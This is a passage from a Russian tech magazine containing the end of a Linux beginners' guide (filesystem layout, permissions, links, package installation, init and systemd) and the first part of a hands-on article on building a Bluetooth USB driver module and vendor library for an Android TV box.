 • /opt — каталог содержит подкаталоги для дополнительных пакетов прог‐
   раммного  обеспечения.  Обычно  используется  проприетарным  ПО,
   которое не подчиняется стандартной иерархии файловой системы Linux;
 • /proc — каталог со специальными файлами, которые предоставляют
   информацию о системе и процессах;
 • /root — домашний каталог суперпользователя root;
 • /run — этот каталог предоставляет приложениям стандартное место
   для файлов, существующих только во время работы системы (отсюда наз‐
   вание), таких как сокеты и идентификаторы процессов;
 • /sbin — эта папка по своему назначению аналогична папке bin. Здесь
   лежат двоичные исполняемые файлы, которые обычно предназначены
   для запуска пользователем root в целях системного администрирования;
 • /tmp — папка для хранения временных файлов по умолчанию;
 • /srv — содержит данные о сервисах, предоставляемых системой;
 • /usr — в этой папке содержатся приложения и файлы пользователей сис‐
   темы. В старых Unix это был аналог /home, но затем эти вещи разделили.
   Условно: в /usr/ — программы, в /home — всякое барахло. Находящиеся
   здесь каталоги /usr/bin, /usr/sbin и /usr/lib раньше имели то же
   назначение, что и аналоги, лежащие в корне, но для файлов пользовате‐
   лей (в то время как папки в корне — для файлов, используемых самой сис‐
   темой). А еще есть каталог /usr/local, где есть свои bin, sbin и lib!
   Когда‑то подразумевалось, что здесь будут программы, специфичные
   для конкретного компьютера, то есть в теории зависящие от его железа.
  На практике софт сюда попадает по самым разным причинам;
 • /var — от слова variable, то есть что‑то, что может меняться. Здесь лежат
   бэкапы, кеши, библиотеки, логи и тому подобные вещи. Одна из важных
   директорий — это /var/www, где  хранятся данные веб‑сайтов, если
   на машине установлен веб‑сервер.





  В современной Ubuntu /bin, /sbin и /lib — это символические ссылки
  на соответствующие каталоги в /usr

Если эта система каталогов кажется тебе немного запутанной, не волнуйся,
это совершенно нормально! Она создавалась годами, и что выросло, то
выросло. Упрощать ее в ближайшем будущем никто не собирается, поскольку
она стандартна и любые изменения повлияют на совместимость.


ПОЛЬЗОВАТЕЛИ, ПРАВА НА ФАЙЛЫ
Linux изначально задумывался как многопользовательская система, а потому
разделение  файлов  и  профилей  пользователей  здесь  организовано
на высочайшем уровне. Пользователь с ограниченными правами в системе
может взаимодействовать с теми или иными файлами и каталогами.
   Важно помнить, что в Linux существует суперпользователь с именем root,
обладающий полными администраторскими привилегиями в операционной
системе, — так сказать, самый главный босс всех боссов. Он может соз‐
давать и удалять учетки других юзеров и вообще менять глобальные настрой‐
ки ОС. Любой юзер может временно побывать в роли root с помощью коман‐
ды sudo (Substitute User and do, дословно «подменить пользователя и выпол‐
нить»). Но сработает этот sudo, только если ты знаешь пароль от учетной
записи суперпользователя.
   Каждому файлу в Linux назначается набор разрешений, определяющих,
кто и что может делать с этим файлом. Эти разрешения обозначаются спе‐
циальными буквами:
 • r (read) — разрешение на чтение файла;
 • w (write) — разрешение на запись в файл;
 • x (execute) — разрешение на запуск файла;
 • - (прочерк) — разрешение не установлено.

Важно помнить, что каталоги Linux тоже считает файлами, поэтому для них
действительны все те же разрешения и ограничения. Однако указанные раз‐
решения не имели бы большого смысла, если бы они распространялись
на всех пользователей операционной системы. К счастью, это не так: в Linux
имеется три категории пользователей, для каждой из которых можно устанав‐
ливать свои собственные разрешения доступа к файлам:
 • владелец — пользователь, который создал этот файл или назначен его
   владельцем. Владельцем файла может быть не только учетная запись, но и
   сама операционная система или приложение, которое создало файл;
 • группа — группа пользователей, «привязанная» к данному файлу. Ты
  можешь узнать, к какой группе пользователей относится твоя учетная
   запись, с помощью консольной команды groups <username>. Список
   всех зарегистрированных в системе групп обычно  хранится в  папке
  /etc/group;
 • другие — все, кто не относится к владельцу файлового объекта или груп‐
  пам пользователей.

Таким образом, разрешения доступа к любому файлу или папке можно
записать в виде строки, состоящей из девяти символов и имеющей сле‐
дующий вид:


rwxrwxrwx

Первые три символа здесь определяют разрешения для владельца фай‐
лового объекта, вторые — для группы, к которой относится владелец файла
или папки, последние три — для всех остальных. Разрешения всегда следуют
именно в таком порядке: «чтение, запись, запуск», то есть rwx. Например,
обозначение вида rwxrw-r-- означает, что владелец этого файла может
делать с ним что угодно, члены его группы — только читать и писать в файл,
но не запускать его (разрешение x не установлено), а всем остальным поль‐
зователям системы файл доступен только на чтение.
   Если эти разрешения установлены для папки, это означает, что поль‐
зователи группы также не смогут запускать хранящиеся в ней файлы, а про‐
чим пользователям открыт  доступ  к содержимому  папки исключительно
в режиме read only.
   Просмотреть права и разрешения файлов и папок можно с помощью кон‐
сольной команды ls, снабженной ключом -l.
   Чтобы изменить права доступа, существует команда chmod (Change Mode).
При помощи этой команды можно даже не прописывать все требуемые раз‐
решения вручную: для лентяев в Linux предусмотрены цифровые обозначения
стандартных наборов разрешений. Например, команда chmod 755 filename
присвоит файлу filename разрешения rwxr-xr-x (каждый пользователь
имеет право читать и запускать на выполнение; владелец может редак‐
тировать), chmod 777 filename даст на выходе rwxrwxrwx (все могут делать
все, что захотят), а «дьявольская» команда chmod 666 filename — вернет
rw-rw-rw- (все пользователи могут читать и редактировать файл).
  В современном Linux существуют еще так называемые специальные раз‐
решения, но их мы рассматривать не будем: для начала информации вполне
достаточно, чтобы чувствовать себя в системе более‑менее уверенно.


ССЫЛКИ
В Windows существуют ярлыки — что это такое, объяснять, думаем, никому
не нужно. В Linux вместо них ссылки, причем двух видов — жесткие и сим‐
волические.
   Жесткая ссылка — это, считай, название файла. Просто в Linux их у файла
может быть несколько, причем находиться они могут в разных каталогах. Сле‐
довательно, если ты создашь жесткую ссылку, а потом удалишь исходный
файл, то он по‑прежнему будет доступен по ссылке — ведь она ничем не хуже
исходного названия, которое ты стер!
   Если же ты удалишь последнюю жесткую ссылку, файловая система боль‐
ше не будет считать, что файл существует, и признает место, где он рас‐
положен, пригодным для записи другой информации.
   Символические ссылки больше похожи на стандартные ярлыки Windows.
Они содержат адрес целевого файла или каталога (жестких ссылок на каталог
не бывает), и если он исчезнет, то ссылка будет вести «в никуда».
   Жесткие ссылки создаются командой ln файл ссылка, а если нужно сде‐
лать символическую ссылку, добавь ключ -s.


УСТАНОВКА СОФТА
Тебе, конечно, никто не мешает загрузить программу в виде одного бинар‐
ного файла и запустить. Главное — не забыть дать ему права на исполнение!
Но такие отдельно стоящие файлы — редкость. Обычно, чтобы программа
работала, в систему нужно установить сразу много всего. Именно поэтому
программы распространяются в виде пакетов через репозиторий.
   Например, в Ubuntu для установки пакета достаточно написать sudo apt
install пакет. Однако рекомендуется сначала сделать sudo apt update,
чтобы ОС обновила свой список пакетов и узнала о выходе новых версий.
   Важное отличие Linux заключается в том, что программа после установки
будет разбросана по разным каталогам. Исполняемые файлы — в свой
каталог, графические ресурсы — в свой, настройки — в свой, и так далее.
При этом программы обычно используют общие библиотеки, что немного
экономит место на диске, но иногда создает неудобные ситуации с версиями
библиотек.
  При использовании такой системы установки практически бесполезно
пытаться  выяснить, куда же  установилась программа. Если тебе вдруг
понадобится удалить ее, пиши apt remove пакет, и его содержимое покинет
твой диск, а вместе с ним уйдут и все компоненты, которые никто, кроме него,
не использовал.
  Но Linux — это страна свободных исходных кодов, а потому сборка прог‐
раммы из исходников — обычное дело. Считай, что вместо кресла ты купил
«конструктор» из IKEA. Важное отличие от нее заключается в том, что вместо
инструкции со смешными человечками ты получаешь Makefile — сценарий
для программы make, который соберет все сам на автопилоте. А по дороге он
изучит и учтет все особенности твоей системы либо наругается на тебя из‑за
отсутствия  каких‑то  компонентов  (в  отличие  от  пакетного  менеджера,
который установил бы их сам).
   Итак, предположим, ты нашел на гитхабе утилиту nnn (это такой минима‐
листичный файловый менеджер, работающий в терминале) и хочешь ее уста‐
новить из исходников. Тебе понадобится сделать следующее.
 1. Удостовериться, что у тебя в системе есть сам Git. Если его нет — уста‐
   нови:


   sudo apt install git

 2. Установить зависимости для nnn. Все их собирать из исходников — нем‐
   ного слишком, поэтому просто пиши


   sudo apt install pkg-config libncursesw5-dev libreadline-dev

 3. Теперь пора достать nnn с GitHub. Это делается такой командой:


   git clone https://github.com/jarun/nnn.git

 4. Заходи в скачанный каталог: cd nnn.
 5. Пиши make и жми Enter. Эта команда найдет Makefile и выполнит инструк‐
   ции по компиляции.
 6. Пиши sudo make install — эта команда разложит созданные бинарные
   файлы по каталогам.

Готово! Можешь писать nnn, находясь в любом каталоге, и файловый менед‐
жер запустится.





                               Сборка nnn





                                nnn

Обрати внимание, это была лишь демонстрация. В реальности проще и луч‐
ше будет установить версию nnn из репозитория. В таком случае пакетный
менеджер сможет обновлять установленную программу и удалить подчистую,
если понадобится. Сборка из исходных кодов может понадобиться, если
софт редкий или нужна самая‑самая новая версия.
   Кстати, помимо бинарных пакетов, в репозиториях бывают и пакеты
с исходниками. Их сборка пройдет на автомате и позволит не морочиться
с установкой зависимостей.
  В последнее время набирают популярность новые системы установки,
в которых программы распространяются вместе со всеми зависимостями
и библиотеками: AppImage, Flatpak и Snap. Это менее экономный метод,
но более удобный и надежный. Также некоторые программы удобно устанав‐
ливать через Docker — то есть вместе с миниатюрным образом Linux. Но раз‐
говор обо всем этом выходит за рамки сегодняшней статьи.


INIT И SYSTEMD
В Unix и Linux большую роль  играет процесс инициализации системы,
за который отвечает утилита init. Древние юниксы до пятой версии просто
исполняли скрипт при включении — считай, аналог autoexec.bat. Когда софта
стало слишком много, пришлось добавить такое понятие, как runlevel.
   Система при загрузке переходит из одной стадии в другую и при каждом
переходе запускает скрипты из определенной папки /etc/rcX.d/, где X —
один из уровней загрузки:
 • 0 — система выключена;
 • 1 — однопользовательский режим;
 • 2 — многопользовательский;
 • 3 — с поддержкой сети;
 • 5 — полная загрузка;
 • 6 — перезагрузка.

Так, если добавить ссылку на скрипт в папку rc0.d, то он будет исполняться
каждый раз перед выключением.





                                 /etc/rc* в Ubuntu

Именно так система делает все, что ей положено делать, — например, запус‐
кает проверку диска после внезапного выключения, ротирует логи, запускает
и останавливает работающие в фоне службы (в Unix и Linux они называются
демонами).
  В современном Linux на смену этой системе пришла еще более изощ‐
ренная — systemd. Она может заодно рулить устройствами и сетевыми
соединениями и делать другие вещи. В systemd для каждого действия
или службы создаются конфигурационные файлы, в которых указано, когда
и при каких условиях нужно что‑то запускать или останавливать. Найти их спи‐
сок ты можешь в /lib/systemd/, а работают с ними при помощи команды
service.
  При этом система с уровнями загрузки пока что тоже поддерживается
в  популярных  дистрибутивах,  несмотря на  присутствие  systemd.  Иначе
были бы проблемы с совместимостью.


             INFO

                        Подробнее о systemd читай в статье «Полезный
                       демон. Как перестать бояться systemd и сделать
                       свой сервис для Linux».



ПРОЧИЕ ПРИЛОЖЕНИЯ
При настройке сети в Linux ты, скорее всего, столкнешься с iptables — стан‐
дартным файрволом и частью системы Netfilter. Если ты выбрал Ubuntu, то
настраивать его можно при помощи удобной утилиты ufw.
   Другая полезнейшая утилита в Linux — это cron. Она делает примерно то
же, что и планировщик заданий в Windows. В новых системах cron работает
бок о бок с уже упомянутым (и гораздо более навороченным) systemd, однако
использовать cron гораздо проще. Всего лишь напиши crontab -e, и в тек‐
стовом редакторе откроется файл со списком программ, которые запускают‐
ся в определенное время. Формат обычно описан там же.


        WWW

                      Сайт crontab.guru очень сильно упрощает работу
                        с crontab.



ИТОГИ
Продолжать рассказывать о Linux можно практически бесконечно, однако мы
оставим это другим статьям. Нашей целью не было заменить этим текстом
серьезные книги по Linux. Мы лишь хотели дать необходимый минимум тем,
кто хочет начать поскорее разбираться на практике. Надеемся, что нам уда‐
лось снабдить тебя необходимым набором начальных  знаний, которые
помогут тебе не заблудиться и не пропасть в темных закоулках Linux!
ТРЮКИ
  BLUETOOTH
ДЛЯ АНДРОИДА
    ПОРТИРУЕМ С LINUX НА ANDROID
       ДРАЙВЕР USB-АДАПТЕРА





Не все USB-устройства начинают работать
на Android сразу после подключения. В этой
статье я  покажу,  как решить  проблему,
на  примере широко  распространенного
Bluetooth-адаптера CSR 4.0. Нам понадо‐        Игорь Орещенков                                                                                                    r0bur@tut.by
бится собрать из исходников ядро Linux
и покопаться в интерфейсной библиотеке
Android.


Современное  железо  редко  предполагает  что‑то  доделывать  руками
или допиливать в прошивках. Однако есть целый класс устройств «ноунейм»,
которые просто‑таки взывают к умелым рукам и пытливым умам. Немного
смекалки, и можно заставить их работать не хуже именитых аналогов.
   Вот, например, ничем не примечательная ТВ‑приставка в виде черной
квадратной пластиковой коробки с надписью «MXQ Pro 4K» на крышке и бюд‐
жетной начинкой: SOC RK3229, 1 Гбайт RAM и 8 Гбайт NAND. У меня она уже
около года  почти  бесперебойно  транслировала на  телевизор YouTube
и каналы интернет‑телевидения, музицировала и сообщала свежие новости.
  В самом начале ее мультимедийной жизни характер у приставки был
строптивый,  и  при  каждом  удобном  случае  она  норовила  зависнуть
или перезагрузиться. Эту проблему удалось решить, установив сглажива‐
ющий фильтр в цепи питания и заменив комплектный блок питания более
качественным.
  В какой‑то момент я подумал, не использовать ли мне эту приставку еще и
для игр. Беспроводной контроллер подошел бы для этого как нельзя лучше.
  В целом контроллеры можно разделить на две категории: RF (Radio
Frequency, радиочастотные) и BT (Bluetooth), оба в итоге работают по ради‐
оканалу.  Вариант с RF  требует  использовать  проприетарный донгл  (и
занимать им порт USB), а Bluetooth должен поддерживаться на стороне прис‐
тавки.
   Зато Bluetooth универсален и, помимо подключения устройств ввода,
может быть использован для вывода звука на беспроводные колонки, фай‐
лового обмена со смартфоном и так далее. Мой выбор был предопределен
тем, что в ближайшем магазине нашелся лишь BT-контроллер VR-PARK.
Не образец изящного дизайна, но не любоваться же на него!
  К сожалению, на плате ТВ‑приставки отсутствует аппаратный BT-модуль,
однако в настройках ее операционной системы Android 7.1.2 я видел пункт
включения Bluetooth, что вроде бы позволяло надеяться на поддержку стека
протоколов. Возможно, после подключения модуля Bluetooth в USB сработа‐
ет магия и сразу представится возможность насладиться игрой?
  С этими мыслями я прикупил USB-адаптер Bluetooth с лаконичной над‐
писью «CSR 4.0» на корпусе. Вернувшись домой, я вставил его в порт прис‐
тавки, и тот весело замигал светодиодом. А после включения Bluetooth в нас‐
тройках... ничего не произошло. То есть почти ничего, если не считать воз‐
никновения задачи, решению которой посвящена эта статья:  настроить
ТВ‑приставку на использование адаптера USB Bluetooth.
   Когда возникает проблема, исследователь первым делом идет в интернет,
чтобы собрать сведения о ней. На удивление, материалов оказалось нем‐
ного. То ли никто не подключал USB-адаптер к приставке, то ли у всех он
работал из коробки, но последние содержательные обсуждения датиро‐
вались 2013 годом и относились к автомобильной системе мультимедиа.
    Результат  бессистемных  попыток  отыскать  работающие  настройки
не порадовал: я только потерял несколько часов и осознал, что придется
искать собственный путь. А для этого необходимо понимать, как подсистема
Bluetooth встроена в Android.


АРХИТЕКТУРА ПОДСИСТЕМЫ BLUETOOTH В ANDROID
С точки зрения программиста, центральный компонент подсистемы Bluetooth
в Android — системная служба Bluetooth (представляющая собой приложение
для Android), которая через Binder IPC дает приложениям доступ к услугам
Bluetooth-профилей, а сама использует при этом JNI-интерфейсы, реали‐
зованные на уровне HAL и ведущие к компонентам стека Bluetooth и рас‐
ширениям поставщика (в двоичных библиотеках).





                 Архитектура подсистемы Bluetooth в Android 7

Эту схему можно продолжить вниз по системной иерархии, и тогда станет
видно, что библиотеки HAL используют интерфейс hci0 для доступа к HCI-
сокетам ядра операционной системы, которые через драйвер позволяют вза‐
имодействовать с аппаратным Bluetooth-модулем, подключенным  к сис‐
темной плате шиной SDIO, UART или USB.





              Нижний уровень подсистемы Bluetooth в Android

Осталось выяснить, на каком именно уровне у нас проблема, которая мешает
адаптеру взять и заработать.
   Операционная система Android — это ядро Linux, поверх которого работа‐
ет гипервизор виртуальных машин Dalvik. Начинать анализ разумно с нижнего
уровня, последовательно убеждаясь в том, что есть физическое подклю‐
чение, операционная система и драйвер видят адаптер, он доступен на уров‐
не HAL и так далее — до момента, когда он должен работать.
   Чтобы исследовать ОС и вносить в нее изменения, нужен доступ к коман‐
дной оболочке с правами суперпользователя. Об основах использования
консоли Android можно прочитать в статье «Консольный Android».


           WARNING

                         Вмешательство в операционную систему с пра‐
                     вами    суперпользователя   может   нарушить
                          работоспособность  устройства и  вывести  его
                       из строя. Принимая решение выполнить описан‐
                     ные в статье рекомендации, исследователь берет
                       на себя полную ответственность за возможные
                         негативные последствия своих действий.



РЕКОГНОСЦИРОВКА
В системных сообщениях dmesg упоминания о Bluetooth встречаются в сле‐
дующих контекстах:



  [1] Bluetooth: Core ver 2.16
  [2] NET: Registered protocol family 31
  [3] Bluetooth: HCI device and connection manager initialized
  [4] Bluetooth: HCI socket layer initialized
  [5] Bluetooth: L2CAP socket layer initialized
  [6] Bluetooth: SCO socket layer initialized
  . . .
  [7] Bluetooth: HCI UART driver ver 2.2
  [8] Bluetooth: HCI H4 protocol initialized
  [9] Bluetooth: HCILL protocol initialized
  [10] rtk_btusb: RTKBT_RELEASE_NAME: 20170109_TV_ANDROID_6.x
  [11] rtk_btusb: Realtek Bluetooth USB driver module init, version 4.1.2
  [12] rtk_btusb: Register usb char device interface for BT driver
  [13] usbcore: registered new interface driver rtk_btusb
  . . .
  [14] Bluetooth: RFCOMM TTY layer initialized
  [15] Bluetooth: RFCOMM socket layer initialized
  [16] Bluetooth: RFCOMM ver 1.11
  [17] Bluetooth: BNEP (Ethernet Emulation) ver 1.3
  [18] Bluetooth: BNEP filters: protocol multicast
  [19] Bluetooth: BNEP socket layer initialized
  [20] Bluetooth: HIDP (Human Interface Emulation) ver 1.2
  [21] Bluetooth: HIDP socket layer initialized
  . . .
  [23] usb 5-1: New USB device found, idVendor=0a12, idProduct=0001
  [24] usb 5-1: New USB device strings: Mfr=0, Product=2, SerialNumber=0
  [25] usb 5-1: Product: CSR8510 A10


Строка 1 говорит о том, что ядро Linux собрано с поддержкой стека Bluetooth,
строка 2 сообщает о регистрации в ядре семейства протоколов Bluetooth.
Сразу после этого инициализируются слои сокетов HCI, L2CAP и SCO (3–6).
   Затем активируются драйверы, предназначенные для взаимодействия
с адаптерами Bluetooth, подключаемыми по шинам UART и USB (7–13).
К сожалению, последний «понимает» только контроллеры Realtek, а наш
адаптер CSR этим драйвером не поддерживается.
   Последний блок сообщений (14–21) информирует об инициализации
высокоуровневых протоколов RFCOMM, BNEP и HIDP стека Bluetooth. Стро‐
ки 23–25 соответствуют реакции операционной системы на подключение
USB-адаптера и говорят о том, что на физическом уровне он опознается
шиной USB.
   Интересно, где же находится драйвер адаптера? Команда lsmod выдала
список из двух модулей, среди которых rtk_btusb не оказалось. Значит, он
интегрирован в ядро Linux. Но список непустой, а значит, ядро собрано с под‐
держкой модулей. Запомним это на будущее.
  Я изучил файловую систему ТВ‑приставки и нашел следующие компонен‐
ты, имеющие отношение к подсистеме Bluetooth:


/app/Bluetooth/Bluetooth.apk
/system/lib/libbluetooth_jni.so
/system/lib/hw/audio.a2dp.default.so
/system/lib/hw/bluetooth.default.so
/system/lib/hw/bluetooth_rtk.default.so
/system/lib/libbt-vendor_uart.so
/system/lib/libbt-vendor_usb.so
/system/lib/rtkbt/...
/system/vendor/libbt-vendor.so
/system/etc/bluetooth/bt_did.conf
/system/etc/bluetooth/bt_stack.conf
/system/etc/bluetooth/bt_vendor.conf
/system/etc/bluetooth/rtkbt.conf
/system/etc/bluetooth/rtkbt_plugins.conf

Следующие команды, последовательно примененные к файлам библиотек,
помогут нам понять их зависимость друг от друга:


$ strings /system/lib/hw/название-библиотеки.so | grep '.so'
$ strings /system/lib/hw/название-библиотеки.so | grep '.conf'

Добавив эти компоненты на схему, я получил следующую картину.





  Взаимосвязь компонентов подсистемы Bluetooth в операционной сис‐
  теме исследуемой ТВ‑приставки

Собранной информации достаточно, чтобы предположить, что драйверы
на ТВ‑приставке не поддерживают Bluetooth-адаптеры на контроллерах CSR.
Поскольку ядро имеет поддержку модулей, можно попытаться исправить
дело, собрав соответствующий модуль с необходимым драйвером.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИТРЮКИ
         BLUETOOTH
      ДЛЯ АНДРОИДА
           ПОРТИРУЕМ С LINUX НА ANDROID ДРАЙВЕР
                                  USB-АДАПТЕРА





МОДУЛЬ ЯДРА С ДРАЙВЕРОМ USB-АДАПТЕРА
В качестве платформы для сборки я использовал 64-битную ОС Bodhi Linux
6.0.0 (основанную на Ubuntu 20.04 LTS). У нее есть минималистичный уста‐
новочный образ, в который входят инструменты метапакета build essential.
Для  наших  работ  достаточно  виртуальной  машины  с  оперативной
памятью 1 Гбайт и накопителем 20 Гбайт. После установки системы и синхро‐
низации с репозиторием надо установить дополнительные пакеты unzip,
python2 и libncurses5 и создать символическую ссылку на интерпретатор:


$ sudo ln -s /usr/bin/python2.7 /usr/bin/python

Создадим каталог для работы:


$ mkdir $HOME/tvbox && cd $HOME/tvbox

Чтобы собрать модуль драйвера, нужны исходники ядра Linux той версии,
которая используется в операционной системе ТВ‑приставки, в данном слу‐
чае 3.10.104. К счастью, на GitHub быстро нашелся репозиторий с ядрами
Linux, адаптированными для устройств на платформе Rockchip. Забираем
исходники из него:


$ wget -C kernel-release-3.10.zip https://github.com/rockchip-linux/
kernel/archive/refs/heads/release-3.10.zip

Теперь надо распаковать полученный архив в рабочий каталог и проверить,
соответствует ли версия ядра ожиданиям:



  $ cd kernel-release-3.10
  $ head Makefile
  VERSION = 3
  PATCHLEVEL = 10
  SUBLEVEL = 104


Чтобы посмотреть, какие конфигурации доступны для платформы Rockchip,
выполним команду



  $ make help | grep rockchip
    rockchip_chromium_defconfig - Build for rockchip_chromium
    rockchip_defconfig       - Build for rockchip


Вариант для операционной системы Chromium OS отбрасываем, остается
rockchip_defconfig. Ищем нужный конфиг:



  $ find ./arch -name 'rockchip_defconfig'
  ./arch/arm64/configs/rockchip_defconfig
  ./arch/arm/configs/rockchip_defconfig


В нашей приставке стоит чип RK3229. Он 32-разрядный, поэтому нам акту‐
ален второй вариант. Для конфигурирования ядра, как написано в kernel-
release-3.10/README и kernel-release-3.10/android/configs/README,
надо выполнить команды


$ ARCH=arm scripts/kconfig/merge_config.sh \
    arch/arm/configs/rockchip_defconfig \
    android/configs/android-base.cfg \
    android/configs/android-recommended.cfg

Далее  в  только  что  созданный  файл  .config  надо  добавить  строку
CONFIG_MODULES=y (после строки CONFIG_MODULES is not set), чтобы вклю‐
чить поддержку модулей ядром, а также строку CONFIG_BT_HCIBTUSB=m (пос‐
ле строки CONFIG_BT_HCIBTUSB is not set) — для сборки драйвера USB-
адаптеров Bluetooth как модуля ядра. После этого выполним команду


$ ARCH=arm make olddefconfig

Исходные  тексты ядра  сконфигурированы и  готовы  к  сборке  модуля.
Собирать будем с помощью инструментов Linaro. Их нужно извлечь из архива
gcc-linaro-4.9.4-2017.01-x86_64_arm-eabi.tar.xz в каталог tvbox, после чего
из подкаталога kernel-release-3.10 выполняем команду


$ PATH=$HOME/tvbox/gcc-linaro-4.9.4-2017.01-x86_64_arm-eabi/bin:$PATH
\
ARCH= arm CROSS_COMPILE=arm-eabi- make modules

Через непродолжительное время модуль ядра будет сформирован в файле
kernel-release-3.10/drivers/bluetooth/btusb.ko.  Этот  файл  надо
записать на ТВ‑приставку в каталог /system/lib/modules и попробовать
запустить:



  # insmod /system/lib/modules/btusb.ko
  insmod: failed to load btusb.ko: Exec format error


Неудача: нам сообщили, что файл имеет неправильный формат. Детальное
описание проблемы можно найти в сообщениях ядра:



  # dmesg | tail
  btusb: version magic '3.10.104 SMP preempt ARMv7 p2v8 ' should
  be '3.10.104 SMP preempt mod_unload ARMv7 p2v8 '


Оказывается, собранная версия не имеет атрибута mod_unload. Придется
вернуться  к  исходным  текстам  и  в  файл  .config  после  строки  #
CONFIG_MODULE_UNLOAD    is    not    set    добавить    параметр
CONFIG_MODULE_UNLOAD=y, а затем повторить сборку:


$ make clean
$ make olddefconfig
$ make modules

Записываем новый модуль на ТВ‑приставку и запускаем:


# insmod /system/lib/modules/btusb.ko

Проверяем результат:



  # dmesg | tail
  usbcore: registered new interface driver btusb


  # lsmod
  Module Size Used by
  btusb 14685 0 [permanent]


Неужели получилось? Пока что все говорит о том, что модуль заработал.
Для проверки воспользуемся командой rfkill (она становится доступной
после установки BusyBox). Сначала надо выполнить команду rfkill list
без подключенного модуля и запомнить ее вывод (если он не пустой). Затем
подключить модуль и повторить выполнение команды:



  # rfkill list
  0: hci0: bluetooth
  Soft blocked: no
  Hard blocked: no


В выводе должны появиться строки, соответствующие подключенному адап‐
теру. Потом адаптер надо отключить и снова выполнить rfkill list. Теперь
строки, соответствующие адаптеру, должны исчезнуть из вывода. Только
такое динамичное поведение говорит о работоспособности драйвера.
   Альтернативный способ проверки — наблюдение за содержимым катало‐
га /sys/class/rfkill. При подключении адаптера Bluetooth в нем должен
создаваться подкаталог rfkillN (где N — номер устройства), а при отклю‐
чении — исчезать.
  Из файла /init.connectivity.rc, который содержит команды, выпол‐
няемые при загрузке системы для инициализации коммуникационных устрой‐
ств, можно узнать, что файлам /sys/class/rfkill/rfkillN/{type,state}
надо назначить владельца bluetooth:net_bt_stack, а файлу state — еще и
права доступа 0664. Сделаем это и попытаемся активировать Bluetooth в нас‐
тройках Android. Увы, но бегунок элемента управления снова возвращается
в положение «Выкл.».
  На этом этапе возникает соблазн раздобыть утилиты hciconfig и hcitool,
чтобы продолжить настраивать подсистему Bluetooth над ядром Linux, но это
тупиковый путь. Наша задача — заставить работать Bluetooth в Android. А для
этого надо принять, что задача обеспечить работу драйвера на уровне ядра
выполнена, и обратиться к нашей схеме за следующей целью. Ей оказалась
«библиотека производителя» libbt-vendor.so — именно она должна обес‐
печить интерфейс между драйвером ядра и подсистемой Bluetooth в Android.


        WWW

                     Для автоматизации описанной выше работы —
                          получения исходных текстов ядра, его настройки
                      и  сборки модуля — можешь  воспользоваться
                    моими сценариями на bash.



БИБЛИОТЕКА ВЗАИМОДЕЙСТВИЯ С ДРАЙВЕРОМ
С библиотекой libbt-vendor.so дело оказалось несколько сложнее, чем
с драйвером. На сайте с исходниками Android обнаружились только матери‐
алы по библиотекам для адаптеров на чипах Realtek и Broadcom. Единствен‐
ный вселяющий надежду репозиторий на GitHub с описанием «A  libbt-
vendor.so  for usb bluetooth on Android» датирован сентябрем 2014 года
и содержит единственный коммит — форк какого‑то давно исчезнувшего
источника.
   Выходит, задача не имеет решения? Или все‑таки попробовать? Эрнест
Хемингуэй в романе «По ком звонит колокол» писал: есть только один способ
убедиться в том, что приказ невыполним, — попытаться его выполнить. Такой
подход не всегда рационален с прагматической точки зрения, но по крайней
мере даже в случае неудачи позволит заявить: «Я сделал все, что мог. Кто
может — пусть сделает лучше!» Поэтому продолжаем. В конце концов, цена
нашей неудачи ничтожна в сравнении с ситуациями, в которых оказывались
герои Хемингуэя.
  В качестве сборочной платформы будем использовать ту же виртуальную
машину, что и для сборки модуля ядра, — ее ресурсов более чем достаточно.
Чтобы получить динамическую библиотеку для Android, потребуется набор
инструментов Android NDK, включающий кросс‑компилятор и заголовочные
файлы. Поскольку целевая система — Android 7.1.2 Nougat, я выбрал инстру‐
ментарий версии r16b, соответствующий периоду расцвета этой системы.
С таким же успехом можно взять r14b или r15c, но другие версии потребуют
серьезной адаптации исходников.
   Чтобы собрать  библиотеку libbt-vendor.so, поддерживающую USB-
адаптеры Bluetooth, потребуются:
 • исходные коды этой библиотеки libbt-usb-master.zip, полученные
   из репозитория liangxiaoju/libbt-usb;
 • исходные коды частей системы Android utils.tar.gz, cutils.tar.gz
   и log.tar.gz из ветви nougat-release (которая соответствует седь‐
  мой версии) с android.googlesource.com;
 • исходные тексты подсистемы Bluedroid bluedroid.tar.gz самой пос‐
   ледней версии из того же репозитория;
 • файл библиотеки libcutils.so из каталога /system/lib файловой
   системы телеприставки.

Эти ингредиенты надо скомпоновать в иерархическую файловую структуру
проекта NDK. В дальнейшем предполагается, что дистрибутив NDK рас‐
пакован в каталог $HOME/tvbox, а для проекта создан подкаталог $HOME/
tvbox/libbt-usb-master, внутри которого:
 • jni — содержимое каталога libbt-usb-master, находящегося в архиве
  libbt-usb-master.zip;
 • jni/include/utils — содержимое архива utils.tar.gz;
 • jni/include/cutils — содержимое архива cutils.tar.gz;
 • jni/include/log — содержимое архива log.tar.gz;
 • jni/lib/libcutils.so — двоичный файл, полученный с телеприставки;
 • external/bluetooth/bluedroid — содержимое архива bluedroid.
  tar.gz.

Помимо   этого,  надо   создать  файл  tvbox/libbt-usb-master/jni/
Application.mk, в котором будет задана минимальная версия Android API
и архитектура целевой системы:


PP_PLATFORM := android-21
PP_ABI := armeabi-v7a


        WWW

                     Ты   можешь   использовать   мои   скрипты
                       для получения исходников и формирования фай‐
                        лового дерева проекта NDK. Скрипт vendor-
                   prepare.sh   дополнительно   модифицирует
                          исходники, без чего сборка проекта не будет
                       успешной.


Теперь процесс сборки можно запускать из каталога tvbox/libbt-usb-
master:


$ ../android-ndk-r16b/ndk-build

Во время сборки будут выданы предупреждения:
 • об         отсутствии         обработчиков       для        операций
  BT_VND_OP_SET_AUDIO_STATE и BT_VND_OP_EPILOG в селекторе switch
   (opcode) файла jni/src/bt_vendor_hci.c;
 • о повторном определении  константы HCI_MAX_FRAME_SIZE в файле
  jni/src/hci.h.

Второе предупреждение можно смело игнорировать, а что до первого, то
пока остается надеяться, что оно касается аудиопрофилей Bluetooth и не
отразится на работе джойстика.
   Собранная  библиотека  находится по пути tvbox/libbt-usb-master/
libs/armeabi-v7a/libbt-vendor.so. Ее надо записать в каталог /system/
vendor/lib телеприставки, после чего можно приступать к испытаниям.
Перед этим, конечно, не будет лишним проверить, что адаптер включен
в USB, его драйвер загружен, а файлам в подкаталоге /sys/class/rfkill/
rfkillN/ даны необходимые разрешения, как это было описано выше.
   Открываем настройки Android, включаем Bluetooth — и приставка сразу
выключается. Включаем приставку и повторяем процедуру — результат тот
же, отрицательный. Обидно, однако это свидетельствует, что мы чего‑то дос‐
тигли и Android взаимодействует с драйвером для Linux. Пусть и в такой
неудачной форме.
